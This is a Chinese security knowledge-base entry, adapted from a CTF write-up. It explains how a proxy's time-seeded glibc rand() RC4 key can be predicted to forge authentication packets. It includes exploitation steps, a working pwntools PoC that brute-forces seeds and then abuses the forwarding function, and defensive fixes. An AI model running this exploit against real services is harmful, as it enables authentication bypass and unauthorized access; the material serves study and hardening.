---
id: crypto-prng-time-seeded-rand-rc4-auth-forge
title: time()+glibc rand() 生成 RC4 会话密钥：预测并伪造认证报文
type: scenario
domain: crypto
path: crypto/prng
technique: time-seeded-rand-rc4-auth-forge
tags:
- prng
- rc4
- srand
- time-seed
- auth-bypass
- ctf
- glibc
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:41:55+08:00'
  notes: 已对照原文与图01（xor循环/0xFFFF2525 magic）核对：头部 magic(4)|xor_key(8)|len(4)、xor_key置0、fill_random_bytes_weak=srand(time(0))+rand()、RC4加密固定口令#welcome!_c1sCn_2026、爆破now±8秒取值cookie均与原文一致。原文为CTF题解，PoC未复跑，代理端口/glibc版本需按环境调整；无组件影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/crypto/prng/crypto-prng-time-seeded-rand-rc4-auth-forge/
draft: false
kb_aliases:
- RC4 密钥预测
- 弱随机 RC4
- 时间种子 RC4
- 伪造认证 cookie
---

## 一句话结论

代理服务用 `srand(time(0)); rand()` 生成 32 字节 RC4 会话密钥、加密固定欢迎口令做认证时，攻击者只需按当前时间前后枚举若干秒种子，用同版本 glibc 复现同一 RC4 密钥并加密已知口令，即可伪造认证包拿到服务端签发的 cookie，进而使用代理的转发功能。

## 原理

- 认证流程：客户端发 16 字节头（实测布局为 `magic(4) | xor_key(8) | payload_len(4)`），代理先按 `xor_key[i & 7]` 对 payload 做异或，再对 `magic == 0xFFFF2525` 的认证包用 RC4 解密，并 `strcmp` 比较固定明文 `#welcome!_c1sCn_2026`；相等则生成 32 字节 cookie 返回。
- RC4 密钥来自 `fill_random_bytes_weak(rc4_key, 32)`：内部是 `srand(time(0))` 后用 `rand()` 逐字节填充。glibc 的 `rand()` 是确定性 PRNG，种子只精确到秒，且同一 libc 实现下同种子产生完全相同的序列。
- RC4 是确定性流密码：相同 key + 相同明文必然得到相同密文。因此只要猜中种子，攻击者就能在本地算出认证包的准确密文。
- 时间窗口很小：目标与攻击机时钟通常只差几秒，枚举 `now-8 .. now+8` 即可覆盖；每个候选种子发一次认证包，收到 32 字节响应即为成功。
- 协议头的异或层不是安全边界：把 8 字节 `xor_key` 全置 0，payload 就按原样进入后续 RC4 解密，不会干扰利用。

## 触发条件

- 认证密钥由 `srand(time(0))`/`rand()`（或其他弱 PRNG）生成，而不是 CSPRNG。
- 认证明文固定或可预测（硬编码口令、固定结构），攻击者能构造对应密文。
- 攻击者能访问代理端口，且知道目标大致时间（通常与本机相差数秒内）。
- 目标与攻击机使用兼容的 libc `rand()` 实现（同版本 glibc 最佳）。
- 认证协议可被重复尝试，没有严格的速率限制或一次性挑战。

## 利用步骤

1. 逆向代理：确认头部布局、异或密钥位置、认证 magic、RC4 解密与固定明文比较逻辑。
2. 将头部 8 字节 `xor_key` 置 0，关闭异或层；记录 `magic=0xFFFF2525`。
3. 取当前 Unix 时间 `now`，对 `seed in [now-8, now+8]`：用本地 glibc `srand(seed)` 生成 32 字节 key（`rand() & 0xff`），用 RC4 加密 `b"#welcome!_c1sCn_2026\x00"`。
4. 按 `magic + xor_key(0) + len(cipher) + cipher` 发送认证包；接收响应，若为 32 字节则为 cookie。
5. 之后发送 `magic=0x7F687985` 的转发包，payload 前 32 字节填 cookie，其余为后端请求（如 `rtsp://...`），代理校验 cookie 后转发到后端服务。

## PoC

```python
import ctypes, time
from pwn import *

HOST, PORT = "127.0.0.1", 9999
AUTH_MAGIC, FORWARD_MAGIC = 0xFFFF2525, 0x7F687985
AUTH_PLAIN = b"#welcome!_c1sCn_2026\x00"
LIB = ctypes.CDLL("./libc.so.6")

def rc4_init(key):
    s = list(range(256)); k = [key[i % len(key)] for i in range(256)]; j = 0
    for i in range(256):
        j = (j + s[i] + k[i]) & 0xff
        s[i], s[j] = s[j], s[i]
    return [s, 0, 0]

def rc4_crypt(state, data):
    s, i, j = state; out = bytearray(data)
    for idx, ch in enumerate(out):
        i = (i + 1) & 0xff; j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        out[idx] = ch ^ s[(s[i] + s[j]) & 0xff]
    state[1], state[2] = i, j
    return bytes(out)

def weak_key(seed):
    LIB.srand(ctypes.c_uint(seed))
    return bytes(LIB.rand() & 0xff for _ in range(32))

def wrap(magic, payload):
    return p32(magic) + b"\x00" * 8 + p32(len(payload)) + payload

now = int(time.time())
for delta in range(-8, 9):
    seed = now + delta
    cipher = rc4_crypt(rc4_init(weak_key(seed)), AUTH_PLAIN)
    io = remote(HOST, PORT)
    io.send(wrap(AUTH_MAGIC, cipher))
    try:
        cookie = io.recv(timeout=0.5)
    except EOFError:
        cookie = b""
    io.close()
    if len(cookie) == 0x20:
        print("seed", seed, "cookie", cookie.hex())
        break

# 拿到 cookie 后转发任意后端请求
io = remote(HOST, PORT)
io.send(wrap(FORWARD_MAGIC, cookie + b"rtsp://OnkI/{add:...}"))
```

## 变体与关联

- 变体：密钥由 `rand()` 生成但认证明文未知时，可先用已知明文/密文对恢复 RC4 密钥流，再伪造其他包（RC4 密钥流重用）。
- 变体：种子来自 `time(NULL)`、`getpid()`、递增计数器或启动时间，均可枚举/预测。
- 变体：固定 cookie 若也被弱随机生成，可直接预测/复用；本场景服务端签发 cookie 用的是强随机，需先通过认证拿到。
- 关联：[[crypto-prng-srand-time-seed-2fa-code-prediction]]（同种 PRNG 预测用于 2FA）、[[crypto-prng-urandom-open-fail-fixed-srand-sequence]]（随机源失败导致固定序列）。

## 检测与防御

- 检测：审计认证密钥生成是否使用 `rand()`/`srand()`/时间种子；监控短时间内大量认证尝试（枚举种子）；检查固定明文口令与无挑战-响应的认证协议。
- 修复：认证密钥使用 CSPRNG（`getrandom`/`/dev/urandom` 且检查返回值）；认证改用带 nonce 的挑战-响应或 HMAC，避免固定明文与可预测密钥。
- 加固：RC4 已不安全，改用 AES-GCM/ChaCha20-Poly1305；对认证失败限速、记录日志；cookie 使用强随机并绑定会话/过期时间。
